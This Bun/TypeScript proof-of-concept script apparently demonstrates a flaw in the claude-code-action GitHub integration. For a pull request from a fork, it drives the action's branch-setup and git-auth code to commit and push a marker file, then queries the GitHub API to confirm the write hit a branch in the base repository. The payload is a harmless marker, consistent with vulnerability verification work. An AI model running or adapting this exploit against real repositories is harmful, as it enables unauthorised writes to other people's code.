#!/usr/bin/env bun

import { $ } from "bun";
import { writeFile } from "fs/promises";
import { readFileSync } from "fs";
import { setupBranch } from "../../claude-code-action-src/src/github/operations/branch";
import { configureGitAuth } from "../../claude-code-action-src/src/github/operations/git-config";

type PullRequestPayload = {
  repository: {
    owner: { login: string };
    name: string;
    full_name: string;
  };
  pull_request: {
    number: number;
    commits: number;
    head: {
      ref: string;
      sha: string;
      repo: {
        full_name: string;
        owner: { login: string };
        name: string;
      };
    };
    base: {
      ref: string;
    };
  };
};

async function ghJson(url: string) {
  const resp = await fetch(url, {
    headers: {
      Accept: "application/vnd.github+json",
      Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      "X-GitHub-Api-Version": "2022-11-28",
    },
  });
  const text = await resp.text();
  let json: any = null;
  try {
    json = text ? JSON.parse(text) : null;
  } catch {
    json = text;
  }
  return { status: resp.status, json };
}

async function main() {
  const eventPath = process.env.GITHUB_EVENT_PATH;
  const token = process.env.GITHUB_TOKEN;
  const runId = process.env.GITHUB_RUN_ID || "unknown";

  if (!eventPath || !token) {
    throw new Error("GITHUB_EVENT_PATH and GITHUB_TOKEN are required");
  }

  const payload = JSON.parse(readFileSync(eventPath, "utf8")) as PullRequestPayload;
  const baseOwner = payload.repository.owner.login;
  const baseRepo = payload.repository.name;
  const baseFullName = payload.repository.full_name;
  const headRepoFullName = payload.pull_request.head.repo.full_name;
  const headOwner = payload.pull_request.head.repo.owner.login;
  const headRepo = payload.pull_request.head.repo.name;
  const headRef = payload.pull_request.head.ref;
  const headShaBefore = payload.pull_request.head.sha;
  const baseRef = payload.pull_request.base.ref;
  const prNumber = payload.pull_request.number;
  const isCrossRepository = headRepoFullName !== baseFullName;

  console.log(`BASE_REPO=${baseFullName}`);
  console.log(`HEAD_REPO=${headRepoFullName}`);
  console.log(`HEAD_REF=${headRef}`);
  console.log(`BASE_REF=${baseRef}`);
  console.log(`CROSS_REPO_PR=${isCrossRepository ? "yes" : "no"}`);

  if (!isCrossRepository) {
    throw new Error("This PoC requires a cross-repository PR");
  }

  const fakeContext: any = {
    repository: { owner: baseOwner, repo: baseRepo },
    entityNumber: prNumber,
    isPR: true,
    inputs: {
      baseBranch: undefined,
      branchPrefix: "claude/",
      branchNameTemplate: "",
    },
  };

  const fakeGithubData: any = {
    contextData: {
      state: "OPEN",
      headRefName: headRef,
      commits: { totalCount: payload.pull_request.commits || 1 },
      isCrossRepository: true,
      baseRefName: baseRef,
    },
  };

  const branchInfo = await setupBranch({} as any, fakeGithubData, fakeContext);
  const checkedOutBranch = (await $`git rev-parse --abbrev-ref HEAD`).text().trim();

  console.log(`BRANCHINFO_CURRENT=${branchInfo.currentBranch}`);
  console.log(`CHECKED_OUT_BRANCH=${checkedOutBranch}`);

  await configureGitAuth(token, fakeContext, {
    login: "github-actions[bot]",
    id: 41898282,
  });

  const markerFile = `cca-crossrepo-marker-pr-${prNumber}.txt`;
  const marker = [
    `CROSSREPO_WRITE_MARKER_RUN=${runId}`,
    `PR_NUMBER=${prNumber}`,
    `HEAD_REPO=${headRepoFullName}`,
    `HEAD_REF=${headRef}`,
    `BASE_REPO=${baseFullName}`,
    `WRITTEN_BRANCH=${branchInfo.currentBranch}`,
  ].join("\n");
  await writeFile(markerFile, marker);

  await $`git add ${markerFile}`;
  await $`git commit -m ${`PoC: wrong-object write for cross-repo PR #${prNumber}`}`;

  await $`bash ${"claude-code-action-src/scripts/git-push.sh"} origin ${branchInfo.currentBranch}`;

  const baseBranchRef = await ghJson(
    `https://api.github.com/repos/${baseOwner}/${baseRepo}/git/ref/heads/${encodeURIComponent(branchInfo.currentBranch)}`,
  );
  const baseMarker = await ghJson(
    `https://api.github.com/repos/${baseOwner}/${baseRepo}/contents/${encodeURIComponent(markerFile)}?ref=${encodeURIComponent(branchInfo.currentBranch)}`,
  );
  const forkBranchRef = await ghJson(
    `https://api.github.com/repos/${headOwner}/${headRepo}/git/ref/heads/${encodeURIComponent(headRef)}`,
  );
  const forkMarker = await ghJson(
    `https://api.github.com/repos/${headOwner}/${headRepo}/contents/${encodeURIComponent(markerFile)}?ref=${encodeURIComponent(headRef)}`,
  );

  const forkShaAfter = forkBranchRef.json?.object?.sha;

  console.log(`BASE_BRANCH_REF_STATUS=${baseBranchRef.status}`);
  console.log(`BASE_MARKER_STATUS=${baseMarker.status}`);
  console.log(`FORK_BRANCH_REF_STATUS=${forkBranchRef.status}`);
  console.log(`FORK_MARKER_STATUS=${forkMarker.status}`);
  console.log(`FORK_SHA_BEFORE=${headShaBefore}`);
  console.log(`FORK_SHA_AFTER=${forkShaAfter || "<missing>"}`);

  console.log(
    `BASE_BRANCH_CREATED_OR_UPDATED=${baseBranchRef.status === 200 ? "yes" : "no"}`,
  );
  console.log(
    `BASE_MARKER_PRESENT=${baseMarker.status === 200 ? "yes" : "no"}`,
  );
  console.log(
    `FORK_BRANCH_UNCHANGED=${forkShaAfter === headShaBefore ? "yes" : "no"}`,
  );
  console.log(
    `FORK_MARKER_PRESENT=${forkMarker.status === 200 ? "yes" : "no"}`,
  );
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
